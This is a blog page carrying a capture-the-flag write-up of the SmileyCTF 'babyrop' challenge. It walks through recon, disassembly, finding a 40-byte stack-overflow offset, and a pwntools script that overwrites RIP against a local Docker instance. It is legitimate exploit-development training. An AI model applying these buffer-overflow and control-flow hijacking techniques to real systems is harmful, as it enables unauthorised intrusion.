<!doctype html>
<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">

<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <meta name="generator" content="Zola v0.21.0" />
  <title>SmileyCTF Babyrop Writeup 1 | Dreamer</title>
  <meta property="og:site_name" content="Dreamer" />
  <meta property="og:title" content="SmileyCTF Babyrop Writeup 1" />
  <meta name="description" content="Reverse engineering and solving the SmileyCTF Babyrop challenge binary. Includes libc leak, Stack pivot and ROP." />
  <meta property="og:description" content="Reverse engineering and solving the SmileyCTF Babyrop challenge binary. Includes libc leak, Stack pivot and ROP." />
  <meta property="og:url" content="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop/" />
  <link rel="canonical" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop/" />
  <meta property="og:type" content="article" />
  <meta property="article:published_time" content="2025-07-17T00:00:00+00:00" />
  <meta property="og:image" content="https://ismailbozkurt.github.io/images/SmileyCTF/SmileyCTF-Babyrop-2/smileyCTF_pic.png" />
  <meta property="og:image:alt" content="Reverse engineering and solving the SmileyCTF Babyrop challenge binary. Includes libc leak, Stack pivot and ROP." />
  <meta property="og:image:width" content="645" />
  <meta property="og:image:height" content="147" />
  <meta property="og:image:type" content="image/png" />
  <link rel="alternate" type="application/atom+xml" href="https://ismailbozkurt.github.io/atom.xml" title="Dreamer | Atom" />
  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
  <!-- Begin Head inject -->
  
  <!-- End Head inject -->
  <link rel="stylesheet" href="https://ismailbozkurt.github.io/main.min.css?h=2e89f7f30f1019877d14" />
  <style>
  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
  </style>
  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://ismailbozkurt.github.io/favicon.ico" />
  <link rel="apple-touch-icon" type="image/png" href="https://ismailbozkurt.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
  <link rel="icon" type="image/png" href="https://ismailbozkurt.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
  <script src="https://ismailbozkurt.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
  <script src="https://ismailbozkurt.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
  <!-- Begin Head End inject -->
  <!-- Umami analytics -->
<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>

<!-- Custom CSS -->
<link rel="stylesheet" href="https://ismailbozkurt.github.io/files/custom.css">

<!-- HEAD END -->

  <!-- End Head End inject -->
</head>

<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
  <!-- Header -->
<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
    <div class="flex justify-between">
      <div class="flex items-center min-h-8">
        <a title="Go to home page" accesskey="!"
          href="https://ismailbozkurt.github.io/" class="text-2xl font-semibold">Dreamer</a>
        <button type="button" title="Switch color scheme" accesskey="$"
          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
        ></button>
        <button type="button" title="Search" accesskey="/"
          onclick="window.linkita.toggleSearch();"
          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
        ></button>
        <script>window.linkita.initSearchButton({ scripts: ["https://ismailbozkurt.github.io/elasticlunr.min.js", "https://ismailbozkurt.github.io/search_index.en.js"] });</script>
      </div>
      <div title="Menu" role="button" accesskey="+" tabindex="0"
        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
        onclick="window.linkita.toggleHeaderMenu();"
        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
      ></div>
    </div>
    <nav class="flex w-full items-center lg:w-auto">
      <menu
        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
        <li>
          <a
            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
            href="https://ismailbozkurt.github.io/infosec_notes"
          >Infosec-Notes</a>
        </li>
        <li>
          <a
            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
            href="https://ismailbozkurt.github.io/posts"
          >Posts</a>
        </li>
        <li>
          <a
            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
            href="https://ismailbozkurt.github.io/about"
          >About</a>
        </li>
        <li>
          <a
            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
            href="https://ismailbozkurt.github.io/n2myself"
          >Note2Myself</a>
        </li>
      </menu>
      <!-- Begin Header Nav inject -->
      
      <!-- End Header Nav inject -->
    </nav>
  </div>
</header>

  <!-- Begin Body Start inject -->
  
  <!-- End Body Start inject -->
  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
      <!-- Search -->
<div id="linkita-search-wrapper" class="hidden">
  <ul id="linkita-search-results"></ul>
</div>

    
<article>
  <!-- Begin Page Start inject -->
  
  <!-- End Page Start inject -->

  <header class="mb-16">
    <h1 class="!my-0 pb-2.5">SmileyCTF Babyrop Writeup 1</h1>
    <!-- Page Info -->
<div class="text-sm antialiased opacity-80"><time
      datetime="2025-07-17T00:00:00+00:00">2025-07-17</time><span
        class="middot"></span><time
    datetime="PT0H6M0S">6&nbsp;min</time><span
      class="middot"></span>
</div>

  </header>
  <figure class="mb-12 mt-0">
    <img
      class="h-auto w-full rounded-lg"
      src="https://ismailbozkurt.github.io/images/SmileyCTF/SmileyCTF-Babyrop-2/smileyCTF_pic.png"
      alt="Reverse engineering and solving the SmileyCTF Babyrop challenge binary. Includes libc leak, Stack pivot and ROP."
      width="645"
      height="147"
    />
  </figure>
  <!-- TOC -->
<div class="block-bg mb-12 rounded-lg p-2 text-lg">
  <details>
    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
      <span class="cursor-pointer">Table of Contents</span>
    </summary>
    <div class="px-2">
      <ul>
        <li>
          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop/#the-challenge">The Challenge</a>
          <ul>
            <li>
              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop/#taking-control-of-rip">Taking control of RIP</a>
            </li>
            <li>
              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop/#creating-basic-exploit-script">Creating basic exploit script</a>
            </li>
            <li>
              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop/#the-exploit-strategy">The exploit strategy</a>
            </li>
            <li>
              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop/#the-problem-of-rbp">The problem of $rbp</a>
            </li>
            <li>
              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop/#preparing-code-execution">Preparing code execution</a>
            </li>
          </ul>
        </li>
      </ul>
    </div>
  </details>
</div>

  <!-- Content -->
  <section><h2 id="the-challenge">The Challenge</h2>
<p>Upon installing the binary, the challenge creators provided several files:</p>
<p>Docker files to reproduce the remote challenge environment.</p>
<p>A shared library file (libc.so.6).</p>
<p>A vulnerable application named vuln.</p>
<p>A dummy flag.txt.</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/…/CTF/SmileyCTF/eth007/babyrop]
</span><span style="color:#bf616a;">└─#</span><span> ls</span><span style="color:#bf616a;"> -al
</span><span style="color:#bf616a;">total</span><span> 2124
</span><span style="color:#bf616a;">drwxr-xr-x</span><span> 2 1001 postgres    4096 Jun 15 17:00 .
</span><span style="color:#bf616a;">drwxr-xr-x</span><span> 3 root root        4096 Jul 16 05:38 ..
</span><span style="color:#bf616a;">-rw-r--r--</span><span> 1 1001 postgres      97 Jun 15 17:00 docker-compose.yml
</span><span style="color:#bf616a;">-rw-r--r--</span><span> 1 1001 postgres    1164 Jun 15 17:00 Dockerfile
</span><span style="color:#bf616a;">-rw-r--r--</span><span> 1 1001 postgres      29 Jun 15 17:00 flag.txt
</span><span style="color:#bf616a;">-rwxr-xr-x</span><span> 1 1001 postgres 2125328 Jun 15 17:00 libc.so.6
</span><span style="color:#bf616a;">-rw-r--r--</span><span> 1 1001 postgres      74 Jun 15 17:00 Makefile
</span><span style="color:#bf616a;">-rw-r--r--</span><span> 1 1001 postgres    1217 Jun 15 17:00 nsjail.cfg
</span><span style="color:#bf616a;">-rw-r--r--</span><span> 1 1001 postgres      59 Jun 15 17:00 run.sh
</span><span style="color:#bf616a;">-rwxr-xr-x</span><span> 1 1001 postgres   16048 Jun 15 17:00 vuln
</span></code></pre>
<p>Let's quickly inspect libc.so.6. It's stripped and has all protections enabled.</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
</span><span style="color:#bf616a;">root@b474638f7398:/host#</span><span> file libc.so.6
</span><span style="color:#bf616a;">libc.so.6:</span><span> ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux)</span><span style="color:#bf616a;">,</span><span> dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID</span><span style="color:#b48ead;">[</span><span>sha1</span><span style="color:#b48ead;">]</span><span>=42c84c92e6f98126b3e2230ebfdead22c235b667, for GNU/Linux 3.2.0, stripped
</span><span style="color:#bf616a;">root@b474638f7398:/host#</span><span> checksec libc.so.6
</span><span style="color:#bf616a;">[*] </span><span>&#39;</span><span style="color:#a3be8c;">/host/libc.so.6</span><span>&#39;
</span><span>    </span><span style="color:#bf616a;">Arch:</span><span>      amd64-64-little
</span><span>    </span><span style="color:#bf616a;">RELRO:</span><span>     Full RELRO
</span><span>    </span><span style="color:#bf616a;">Stack:</span><span>     Canary found
</span><span>    </span><span style="color:#bf616a;">NX:</span><span>        NX enabled
</span><span>    </span><span style="color:#bf616a;">PIE:</span><span>       PIE enabled
</span><span>    </span><span style="color:#bf616a;">FORTIFY:</span><span>   Enabled
</span><span>    </span><span style="color:#bf616a;">SHSTK:</span><span>     Enabled
</span><span>    </span><span style="color:#bf616a;">IBT:</span><span>       Enabled
</span></code></pre>
<p>The challenge binary, vuln, has Full RELRO and NX enabled, but no stack canary and PIE is disabled. Being unstripped will simplify debugging.</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">root@b474638f7398:/host#</span><span> checksec vuln
</span><span style="color:#bf616a;">[*] </span><span>&#39;</span><span style="color:#a3be8c;">/host/vuln</span><span>&#39;
</span><span>    </span><span style="color:#bf616a;">Arch:</span><span>      amd64-64-little
</span><span>    </span><span style="color:#bf616a;">RELRO:</span><span>     Full RELRO
</span><span>    </span><span style="color:#bf616a;">Stack:</span><span>     No canary found
</span><span>    </span><span style="color:#bf616a;">NX:</span><span>        NX enabled
</span><span>    </span><span style="color:#bf616a;">PIE:</span><span>       No PIE (0x400000)
</span><span>    </span><span style="color:#bf616a;">SHSTK:</span><span>     Enabled
</span><span>    </span><span style="color:#bf616a;">IBT:</span><span>       Enabled
</span><span>    </span><span style="color:#bf616a;">Stripped:</span><span>  No
</span><span style="color:#bf616a;">root@b474638f7398:/host#</span><span> file vuln
</span><span style="color:#bf616a;">vuln:</span><span> ELF 64-bit LSB executable, x86-64, version 1 (SYSV)</span><span style="color:#bf616a;">,</span><span> dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID</span><span style="color:#b48ead;">[</span><span>sha1</span><span style="color:#b48ead;">]</span><span>=dd756860c1c9ffe7287a887c8792773c4c4b4e13, for GNU/Linux 3.2.0, not stripped
</span></code></pre>
<p>Let's examine the symbols. I've highlighted some interesting lines from the symbols:</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">readelf -s</span><span> ./vuln
</span><span style="color:#bf616a;">Most</span><span> symbols are standard, except for the gadgets function. Given the challenge name, babyrop, these are likely provided by the challenge creators to assist us in building a ROP chain.
</span><span>
</span><span style="color:#bf616a;">Noted</span><span> here as a reminder:
</span><span>
</span><span style="color:#bf616a;">objdump -d</span><span> ./vuln</span><span style="color:#bf616a;"> -M</span><span> intel
</span><span>
</span><span style="color:#bf616a;">...
</span><span style="color:#bf616a;">0000000000401176 </span><span>&lt;gadgets&gt;:
</span><span>  </span><span style="color:#bf616a;">401176:</span><span>        f3 0f 1e fa              endbr64
</span><span>  </span><span style="color:#bf616a;">40117a:</span><span>        55                       push   rbp
</span><span>  </span><span style="color:#bf616a;">40117b:</span><span>        48 89 e5                 mov    rbp,rsp
</span><span>  </span><span style="color:#bf616a;">40117e:</span><span>        59                       pop    rcx
</span><span>  </span><span style="color:#bf616a;">40117f:</span><span>        c3                       ret
</span><span>  </span><span style="color:#bf616a;">401180:</span><span>        90                       nop
</span><span>  </span><span style="color:#bf616a;">401181:</span><span>        5d                       pop    rbp
</span><span>  </span><span style="color:#bf616a;">401182:</span><span>        c3                       ret
</span><span style="color:#bf616a;">...
</span><span style="color:#bf616a;">A</span><span> custom gets function is also defined:
</span><span>
</span><span>
</span><span style="color:#bf616a;">0000000000401183 </span><span>&lt;gets&gt;:
</span><span>  </span><span style="color:#bf616a;">401183:</span><span>        f3 0f 1e fa              endbr64
</span><span>  </span><span style="color:#bf616a;">401187:</span><span>        55                       push   rbp
</span><span>  </span><span style="color:#bf616a;">401188:</span><span>        48 89 e5                 mov    rbp,rsp
</span><span>  </span><span style="color:#bf616a;">40118b:</span><span>        48 83 ec 20              sub    rsp,0x20
</span><span>  </span><span style="color:#bf616a;">40118f:</span><span>        48 89 7d e8              mov    QWORD PTR </span><span style="color:#b48ead;">[</span><span>rbp-0x18</span><span style="color:#b48ead;">]</span><span>,rdi
</span><span>  </span><span style="color:#bf616a;">401193:</span><span>        48 8b 45 e8              mov    rax,QWORD PTR </span><span style="color:#b48ead;">[</span><span>rbp-0x18</span><span style="color:#b48ead;">]
</span><span>  </span><span style="color:#bf616a;">401197:</span><span>        ba bc 02 00 00           mov    edx,0x2bc
</span><span>  </span><span style="color:#bf616a;">40119c:</span><span>        48 89 c6                 mov    rsi,rax
</span><span>  </span><span style="color:#bf616a;">40119f:</span><span>        bf 00 00 00 00           mov    edi,0x0
</span><span>  </span><span style="color:#bf616a;">4011a4:</span><span>        b8 00 00 00 00           mov    eax,0x0
</span><span>  </span><span style="color:#bf616a;">4011a9:</span><span>        e8 d2 fe ff ff           call   401080 &lt;read@plt&gt;
</span><span>  </span><span style="color:#bf616a;">4011ae:</span><span>        89 45 fc                 mov    DWORD PTR </span><span style="color:#b48ead;">[</span><span>rbp-0x4</span><span style="color:#b48ead;">]</span><span>,eax
</span><span>  </span><span style="color:#bf616a;">4011b1:</span><span>        83 7d fc 00              cmp    DWORD PTR </span><span style="color:#b48ead;">[</span><span>rbp-0x4</span><span style="color:#b48ead;">]</span><span>,0x0
</span><span>  </span><span style="color:#bf616a;">4011b5:</span><span>        7e 13                    jle    4011ca &lt;gets+0x47&gt;
</span><span>  </span><span style="color:#bf616a;">4011b7:</span><span>        8b 45 fc                 mov    eax,DWORD PTR </span><span style="color:#b48ead;">[</span><span>rbp-0x4</span><span style="color:#b48ead;">]
</span><span>  </span><span style="color:#bf616a;">4011ba:</span><span>        48 98                    cdqe
</span><span>  </span><span style="color:#bf616a;">4011bc:</span><span>        48 8d 50 ff              lea    rdx,</span><span style="color:#b48ead;">[</span><span>rax-0x1</span><span style="color:#b48ead;">]
</span><span>  </span><span style="color:#bf616a;">4011c0:</span><span>        48 8b 45 e8              mov    rax,QWORD PTR </span><span style="color:#b48ead;">[</span><span>rbp-0x18</span><span style="color:#b48ead;">]
</span><span>  </span><span style="color:#bf616a;">4011c4:</span><span>        48 01 d0                 add    rax,rdx
</span><span>  </span><span style="color:#bf616a;">4011c7:</span><span>        c6 00 00                 mov    BYTE PTR </span><span style="color:#b48ead;">[</span><span>rax</span><span style="color:#b48ead;">]</span><span>,0x0
</span><span>  </span><span style="color:#bf616a;">4011ca:</span><span>        8b 45 fc                 mov    eax,DWORD PTR </span><span style="color:#b48ead;">[</span><span>rbp-0x4</span><span style="color:#b48ead;">]
</span><span>  </span><span style="color:#bf616a;">4011cd:</span><span>        c9                       leave
</span><span>  </span><span style="color:#bf616a;">4011ce:</span><span>        c3                       ret
</span></code></pre>
<p>The challenge binary's logic is straightforward: it takes user input and then prints it back. The buffer length is not properly controlled, leading to a stack-based buffer overflow.</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">root@30ee3317d43a:/host#</span><span> ./vuln
</span><span style="color:#bf616a;">AAAAAAAA
</span><span style="color:#bf616a;">AAAAAAAA
</span><span style="color:#bf616a;">root@30ee3317d43a:/host#</span><span> ./vuln
</span><span style="color:#bf616a;">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span style="color:#bf616a;">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span style="color:#bf616a;">Segmentation</span><span> fault (core dumped)
</span></code></pre>
<h3 id="taking-control-of-rip">Taking control of RIP</h3>
<p>I set a breakpoint at <code>*main+88</code> and then created an 80-byte pattern.</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">gef➤</span><span>  disas main
</span><span style="color:#bf616a;">Dump</span><span> of assembler code for function main:
</span><span>   </span><span style="color:#bf616a;">0x00000000004011cf </span><span>&lt;+0&gt;:     endbr64
</span><span>   </span><span style="color:#bf616a;">0x00000000004011d3 </span><span>&lt;+4&gt;:     push   rbp
</span><span>   </span><span style="color:#bf616a;">0x00000000004011d4 </span><span>&lt;+5&gt;:     mov    rbp,rsp
</span><span>   </span><span style="color:#bf616a;">0x00000000004011d7 </span><span>&lt;+8&gt;:     sub    rsp,0x20
</span><span>   </span><span style="color:#bf616a;">0x00000000004011db </span><span>&lt;+12&gt;:    mov    rax,QWORD PTR </span><span style="color:#b48ead;">[</span><span>rip+0x2e36</span><span style="color:#b48ead;">]        </span><span style="color:#65737e;"># 0x404018 &lt;stdout@GLIBC_2.2.5&gt;
</span><span>   </span><span style="color:#bf616a;">0x00000000004011e2 </span><span>&lt;+19&gt;:    mov    esi,0x0
</span><span>   </span><span style="color:#bf616a;">0x00000000004011e7 </span><span>&lt;+24&gt;:    mov    rdi,rax
</span><span>   </span><span style="color:#bf616a;">0x00000000004011ea </span><span>&lt;+27&gt;:    call   0x401060 &lt;setbuf@plt&gt;
</span><span>   </span><span style="color:#bf616a;">0x00000000004011ef </span><span>&lt;+32&gt;:    lea    rax,</span><span style="color:#b48ead;">[</span><span>rbp-0x20</span><span style="color:#b48ead;">]
</span><span>   </span><span style="color:#bf616a;">0x00000000004011f3 </span><span>&lt;+36&gt;:    mov    edx,0x20
</span><span>   </span><span style="color:#bf616a;">0x00000000004011f8 </span><span>&lt;+41&gt;:    mov    esi,0x0
</span><span>   </span><span style="color:#bf616a;">0x00000000004011fd </span><span>&lt;+46&gt;:    mov    rdi,rax
</span><span>   </span><span style="color:#bf616a;">0x0000000000401200 </span><span>&lt;+49&gt;:    call   0x401070 &lt;memset@plt&gt;
</span><span>   </span><span style="color:#bf616a;">0x0000000000401205 </span><span>&lt;+54&gt;:    lea    rax,</span><span style="color:#b48ead;">[</span><span>rbp-0x20</span><span style="color:#b48ead;">]
</span><span>   </span><span style="color:#bf616a;">0x0000000000401209 </span><span>&lt;+58&gt;:    mov    rdi,rax
</span><span>   </span><span style="color:#bf616a;">0x000000000040120c </span><span>&lt;+61&gt;:    call   0x401183 &lt;gets&gt;
</span><span>   </span><span style="color:#bf616a;">0x0000000000401211 </span><span>&lt;+66&gt;:    mov    rdx,QWORD PTR </span><span style="color:#b48ead;">[</span><span>rip+0x2df8</span><span style="color:#b48ead;">]        </span><span style="color:#65737e;"># 0x404010 &lt;print&gt;
</span><span>   </span><span style="color:#bf616a;">0x0000000000401218 </span><span>&lt;+73&gt;:    lea    rax,</span><span style="color:#b48ead;">[</span><span>rbp-0x20</span><span style="color:#b48ead;">]
</span><span>   </span><span style="color:#bf616a;">0x000000000040121c </span><span>&lt;+77&gt;:    mov    rdi,rax
</span><span>   </span><span style="color:#bf616a;">0x000000000040121f </span><span>&lt;+80&gt;:    call   rdx
</span><span>   </span><span style="color:#bf616a;">0x0000000000401221 </span><span>&lt;+82&gt;:    mov    eax,0x0
</span><span>   </span><span style="color:#bf616a;">0x0000000000401226 </span><span>&lt;+87&gt;:    leave
</span><span>=&gt; </span><span style="color:#d08770;">0</span><span style="color:#bf616a;">x0000000000401227 </span><span>&lt;+88&gt;:    ret
</span><span style="color:#bf616a;">End</span><span> of assembler dump.
</span><span style="color:#bf616a;">gef➤</span><span>  pattern create 80
</span><span style="color:#bf616a;">[+]</span><span> Generating a pattern of 80 bytes (n=8)
</span><span style="color:#bf616a;">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
</span><span style="color:#bf616a;">[+]</span><span> Saved as &#39;</span><span style="color:#a3be8c;">$_gef1</span><span>&#39;
</span><span style="color:#bf616a;">gef➤  
</span><span>
</span></code></pre>
<p>Running the binary and providing the pattern string revealed an offset of 40 bytes. This means that after 40 bytes, the next 8 bytes will overwrite the RIP register.</p>
<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/Pasted_image_20250716062356.png" alt="Pasted image 20250716062356" /></p>
<h3 id="creating-basic-exploit-script">Creating basic exploit script</h3>
<p>To run the Docker container, it exposes port 42123.</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">docker-compose -f</span><span> docker-compose.yml up
</span></code></pre>
<p><code>pwntools</code> offers excellent features, and one of my favorites is its exploit template generation. Here's how I generated the template:</p>
<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">root@30ee3317d43a:/host#</span><span> pwn template</span><span style="color:#bf616a;"> --host</span><span>=127.0.0.1</span><span style="color:#bf616a;"> --port</span><span>=42123</span><span style="color:#bf616a;"> --libc</span><span>=./libc.so.6</span><span style="color:#bf616a;"> --quiet</span><span> ./vuln |</span><span style="color:#bf616a;">tee</span><span> exploit.py
</span><span style="color:#65737e;">#!/usr/bin/env python3
</span><span style="color:#65737e;"># -*- coding: utf-8 -*-
</span><span style="color:#bf616a;">from</span><span> pwn import *
</span><span>
</span><span style="color:#bf616a;">exe</span><span> = context.binary = ELF(args.EXE or &#39;</span><span style="color:#a3be8c;">./vuln</span><span>&#39;)
</span><span>
</span><span style="color:#bf616a;">host</span><span> = args.HOST or &#39;</span><span style="color:#a3be8c;">127.0.0.1</span><span>&#39;
</span><span style="color:#bf616a;">port</span><span> = int(args.PORT or 42123)
</span><span>
</span><span style="color:#b48ead;">if </span><span style="color:#bf616a;">args.LOCAL_LIBC:
</span><span>    </span><span style="color:#bf616a;">libc</span><span> = exe.libc
</span><span style="color:#b48ead;">elif </span><span style="color:#bf616a;">args.LOCAL:
</span><span>    </span><span style="color:#bf616a;">library_path</span><span> = libcdb.download_libraries(&#39;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&#39;)
</span><span>    </span><span style="color:#b48ead;">if </span><span style="color:#bf616a;">library_path:
</span><span>        </span><span style="color:#bf616a;">exe</span><span> = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
</span><span>        </span><span style="color:#bf616a;">libc</span><span> = exe.libc
</span><span>    </span><span style="color:#b48ead;">else</span><span style="color:#96b5b4;">:
</span><span>        </span><span style="color:#bf616a;">libc</span><span> = ELF(&#39;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&#39;)
</span><span style="color:#b48ead;">else</span><span style="color:#96b5b4;">:
</span><span>    </span><span style="color:#bf616a;">libc</span><span> = ELF(&#39;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&#39;)
</span><span>
</span><span style="color:#bf616a;">def</span><span> start_local(argv=</span><span style="color:#b48ead;">[]</span><span>, *a, **kw)</span><span style="color:#96b5b4;">:
</span><span>    &#39;&#39;&#39;</span><span style="color:#a3be8c;">Execute the target binary locally</span><span>&#39;&#39;&#39;
</span><span>    </span><span style="color:#b48ead;">if </span><span style="color:#bf616a;">args.GDB:
</span><span>        </span><span style="color:#b48ead;">return</span><span> gdb.debug(</span><span style="color:#b48ead;">[</span><span>exe.path</span><span style="color:#b48ead;">]</span><span> + argv, gdbscript=gdbscript, *a, **kw)
</span><span>    </span><span style="color:#b48ead;">else</span><span style="color:#96b5b4;">:
</span><span>        </span><span style="color:#b48ead;">return</span><span> process(</span><span style="color:#b48ead;">[</span><span>exe.path</span><span style="color:#b48ead;">]</span><span> + argv, *a, **kw)
</span><span>
</span><span style="color:#bf616a;">def</span><span> start_remote(argv=</span><span style="color:#b48ead;">[]</span><span>, *a, **kw)</span><span style="color:#96b5b4;">:
</span><span>    &#39;&#39;&#39;</span><span style="color:#a3be8c;">Connect to the process on the remote host</span><span>&#39;&#39;&#39;
</span><span>    </span><span style="color:#bf616a;">io</span><span> = connect(host, port)
</span><span>    </span><span style="color:#b48ead;">if </span><span style="color:#bf616a;">args.GDB:
</span><span>        </span><span style="color:#bf616a;">gdb.attach</span><span>(io, gdbscript=gdbscript)
</span><span>    </span><span style="color:#b48ead;">return</span><span> io
</span><span>
</span><span style="color:#bf616a;">def</span><span> start(argv=</span><span style="color:#b48ead;">[]</span><span>, *a, **kw)</span><span style="color:#96b5b4;">:
</span><span>    &#39;&#39;&#39;</span><span style="color:#a3be8c;">Start the exploit against the target.</span><span>&#39;&#39;&#39;
</span><span>    </span><span style="color:#b48ead;">if </span><span style="color:#bf616a;">args.LOCAL:
</span><span>        </span><span style="color:#b48ead;">return</span><span> start_local(argv, *a, **kw)
</span><span>    </span><span style="color:#b48ead;">else</span><span style="color:#96b5b4;">:
</span><span>        </span><span style="color:#b48ead;">return</span><span> start_remote(argv, *a, **kw)
</span><span>
</span><span style="color:#bf616a;">gdbscript</span><span> = &#39;&#39;&#39;
</span><span style="color:#a3be8c;">tbreak main
</span><span style="color:#a3be8c;">continue
</span><span>&#39;&#39;&#39;.format(**locals())
</span><span>
</span><span style="color:#65737e;"># -- Exploit goes here --
</span><span>
</span><span style="color:#bf616a;">io</span><span> = start()
</span><span>
</span><span style="color:#8fa1b3;">io.interactive</span><span>()
</span><span>
</span></code></pre>
<p>Here are the changes I made to the <code>exploit.py</code> script. If you're new to this area, these modifications might be particularly helpful.</p>
<p>To send a payload and debug simultaneously, you need to set context.terminal. I use <code>tmux</code> for this.</p>
<p>I set a breakpoint at <code>main+88</code>, which is the end of the main function. Another pwntools feature I appreciate is the <code>flat</code> method. We're simply telling it to send <code>0x4141414142424242</code> after 40 bytes.</p>
<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>context.terminal = [&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
</span><span>
</span><span style="color:#d08770;">...
</span><span style="color:#d08770;">...
</span><span style="color:#d08770;">...
</span><span>gdbscript = &#39;&#39;&#39;
</span><span style="color:#a3be8c;">tbreak main
</span><span style="color:#a3be8c;">tbreak *main+88
</span><span style="color:#a3be8c;">continue
</span><span>&#39;&#39;&#39;.</span><span style="color:#bf616a;">format</span><span>(**</span><span style="color:#96b5b4;">locals</span><span>())
</span><span>
</span><span style="color:#65737e;"># -- Exploit goes here --
</span><span>
</span><span>io = </span><span style="color:#bf616a;">start</span><span>()
</span><span>
</span><span>
</span><span>
</span><span>payload = </span><span style="color:#bf616a;">flat</span><span>({
</span><span>    </span><span style="color:#d08770;">40</span><span>:[
</span><span>        </span><span style="color:#d08770;">0x4141414142424242
</span><span>      ]
</span><span>    })
</span><span>
</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
</span><span>
</span></code></pre>
<p>After executing <code>exploit.py</code>, the <code>RIP register</code> was successfully overwritten with <code>0x4141414142424242</code>.</p>
